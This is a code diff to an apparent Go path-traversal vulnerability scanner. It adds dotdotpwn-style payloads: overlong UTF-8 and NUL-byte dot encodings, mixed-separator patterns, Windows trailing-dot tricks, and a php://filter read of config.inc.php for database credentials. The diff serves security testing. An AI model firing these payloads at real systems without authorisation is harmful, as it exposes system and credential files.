@@ -14,6 +14,13 @@ type moduleMeta struct {
 	// pathOnly limits the module to path-segment injection points. The
 	// nginx alias check needs the segment's own name, so it only applies there.
 	pathOnly bool
+	// depthStep, when set, is the single traversal step this module's payloads
+	// repeat (for example "../"). After a read is confirmed, the scanner
+	// binary-searches the smallest number of these steps that still reads the
+	// file and reports it, the way dotdotpwn's bisection algorithm pins down
+	// the exact traversal depth. Only set on modules whose payloads are a plain
+	// repetition of one step followed by the target file.
+	depthStep string
 }
 
 // payload is one traversal string plus how it is built. build receives the
@@ -39,6 +46,15 @@ type module struct {
 const (
 	unixTarget    = "etc/passwd"
 	windowsTarget = "win.ini"
+	// issueTarget is a second Unix oracle (see dotdotpwn's @Unix_files). Its
+	// read is confirmed by the /etc/issue signature, so it catches a host
+	// where /etc/passwd is not readable by the web user but /etc/issue is.
+	issueTarget = "etc/issue"
+	// webConfigTarget is an IIS application's config file (dotdotpwn's
+	// @Extra_files). It sits in the app's own directory rather than at a fixed
+	// absolute path, so the payloads below try a short climb and the canonical
+	// inetpub location.
+	webConfigTarget = "web.config"
 )
 
 // winPath turns a forward-slash path into the backslash form Windows
@@ -65,7 +81,7 @@ func repeatSeq(step string, n int) string {
 // depth where extra ../ steps are clamped at the filesystem root. The /proc
 // entry checks the same climb against a second file.
 var classicModule = module{
-	moduleMeta: moduleMeta{id: "classic-traversal", name: "Path traversal: ../ sequences", severity: "high"},
+	moduleMeta: moduleMeta{id: "classic-traversal", name: "Path traversal: ../ sequences", severity: "high", depthStep: "../"},
 	payloads: []payload{
 		{name: "../ x1", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 1) + f }},
 		{name: "../ x2", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 2) + f }},
@@ -73,6 +89,8 @@ var classicModule = module{
 		{name: "../ x8", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 8) + f }},
 		{name: "../ x16", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 16) + f }},
 		{name: "../ x4 proc/version", target: "proc/version", build: func(f string, _ point) string { return repeatSeq("../", 4) + f }},
+		// /etc/issue, a second Unix oracle (dotdotpwn's @Unix_files).
+		{name: "../ x8 /etc/issue", target: issueTarget, build: func(f string, _ point) string { return repeatSeq("../", 8) + f }},
 	},
 }
 
@@ -128,6 +146,30 @@ var windowsModule = module{
 		{name: `..\ x4 hosts file`, target: "system32/drivers/etc/hosts", build: func(f string, _ point) string {
 			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f)
 		}},
+		// Trailing dot: Windows strips a trailing "." from a filename, so an
+		// app that appends a fixed extension to the name still opens win.ini
+		// when the user value ends in the real name plus ".". dotdotpwn carries
+		// this as one of its @Special_Sufixes.
+		{name: `..\ x4 win.ini trailing dot`, target: windowsTarget, build: func(f string, _ point) string {
+			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f) + "."
+		}},
+		// Trailing space: Windows strips a trailing space as well, the same
+		// trick against an appended extension.
+		{name: `..\ x4 win.ini trailing space`, target: windowsTarget, build: func(f string, _ point) string {
+			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f) + " "
+		}},
+		// web.config in the canonical inetpub web root, read without any "..".
+		{name: `\inetpub\wwwroot\web.config`, target: webConfigTarget, build: func(f string, _ point) string {
+			return `C:\inetpub\wwwroot\` + winPath(f)
+		}},
+		// web.config one and three directories up, for an app served from a
+		// subdirectory of the web root.
+		{name: `..\ x1 web.config`, target: webConfigTarget, build: func(f string, _ point) string {
+			return repeatSeq(`..\`, 1) + winPath(f)
+		}},
+		{name: `..\ x3 web.config`, target: webConfigTarget, build: func(f string, _ point) string {
+			return repeatSeq(`..\`, 3) + winPath(f)
+		}},
 	},
 }
 
@@ -161,6 +203,28 @@ var encodedModule = module{
 		}},
 		{name: "%e0%80%ae overlong UTF-8 x4", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("%e0%80%ae%e0%80%ae%e0%80%af", 4) + encodeSlash(f, "%e0%80%af")
+		}},
+		// Four-byte overlong UTF-8: 0xF0 0x80 0x80 0xAE is an invalid "." and
+		// 0xF0 0x80 0x80 0xAF an invalid "/". dotdotpwn carries these (and the
+		// 5/6-byte forms) because some lenient decoders fold them to ASCII.
+		{name: "%f0%80%80%ae 4-byte overlong x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("%f0%80%80%ae%f0%80%80%ae%f0%80%80%af", 4) + encodeSlash(f, "%f0%80%80%af")
+		}},
+		// %c0%2e is another overlong dot form (an invalid two-byte encoding of
+		// "."), paired with the %c0%af overlong slash.
+		{name: "%c0%2e overlong dot x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("%c0%2e%c0%2e%c0%af", 4) + encodeSlash(f, "%c0%af")
+		}},
+		// A NUL between the dots: ".%00." decodes to ".\0." which a C-based
+		// path API may read as ".." after truncating at the NUL, while a naive
+		// "../" filter never matches it. dotdotpwn lists ".%00." among its dots.
+		{name: ".%00. null-in-dots x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq(".%00./", 4) + f
+		}},
+		// A trailing control byte on the dots ("..%01"), another dotdotpwn dot
+		// variant that slips past a filter matching the literal "..".
+		{name: "..%01 control-byte dots x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%01/", 4) + f
 		}},
 		// Dots written as overlong UTF-8 with the slash left as a plain "/".
 		{name: "..%c0%af overlong slash x4", target: unixTarget, build: func(f string, _ point) string {
@@ -286,6 +350,12 @@ var phpWrapperModule = module{
 		{name: "php://filter base64 index.php source", target: "index.php", build: func(f string, _ point) string {
 			return "php://filter/convert.base64-encode/resource=" + f
 		}},
+		// config.inc.php a few directories up (dotdotpwn's @Extra_files). A
+		// config file commonly holds DB credentials, and its read is confirmed
+		// by the PHP-source signature once the base64 is decoded.
+		{name: "php://filter base64 ../ x3 config.inc.php", target: "config.inc.php", build: func(f string, _ point) string {
+			return "php://filter/convert.base64-encode/resource=" + repeatSeq("../", 3) + f
+		}},
 	},
 }
 
@@ -306,10 +376,35 @@ var aliasModule = module{
 	},
 }
 
+// separatorModule holds dotdotpwn's "special patterns": literal mixes of dots
+// and the two separator styles. Each one targets a filter that normalizes or
+// strips only one separator form, or that collapses one level of "." or "/"
+// and leaves a working traversal behind. These are written with real "/" and
+// "\" rather than percent escapes, so they reach the app without a decode.
+var separatorModule = module{
+	moduleMeta: moduleMeta{id: "separator-variants", name: "Path traversal: separator and dot-sequence variants", severity: "high"},
+	payloads: []payload{
+		// Doubled forward slashes: an app that collapses "//" to "/" turns
+		// these back into a plain traversal.
+		{name: "..// double-slash x4", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("..//", 4) + f }},
+		{name: "...// triple-dot double-slash x4", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("...//", 4) + f }},
+		// Mixed separators: a filter that strips only "/" or only "\" leaves
+		// the other in place, and the OS accepts both.
+		{name: `..\/ mixed separators x4`, target: unixTarget, build: func(f string, _ point) string { return repeatSeq(`..\/`, 4) + f }},
+		{name: `../\ mixed separators x4`, target: unixTarget, build: func(f string, _ point) string { return repeatSeq(`../\`, 4) + f }},
+		// A leading "." on each step ("./../"): a single pass that removes
+		// "./" rewrites it to "../".
+		{name: "./../ leading-dot x4", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("./../", 4) + f }},
+		// dotdotpwn's "......///" special pattern: extra dots and slashes that
+		// one normalization pass reduces to a traversal.
+		{name: "....../// extra dots and slashes", target: unixTarget, build: func(f string, _ point) string { return "......///" + f }},
+	},
+}
+
 // modules is the full battery, in the order a run reports them. The
 // per-point loop stops at the first confirmed read, so later payloads in a
 // module are skipped on points already known to be vulnerable.
-var modules = []module{classicModule, windowsModule, encodedModule, absoluteModule, phpWrapperModule, aliasModule}
+var modules = []module{classicModule, windowsModule, encodedModule, separatorModule, absoluteModule, phpWrapperModule, aliasModule}
 
 // negativeControlName is what the control request asks for. It contains no
 // separators and does not exist on any normal server, so a response that
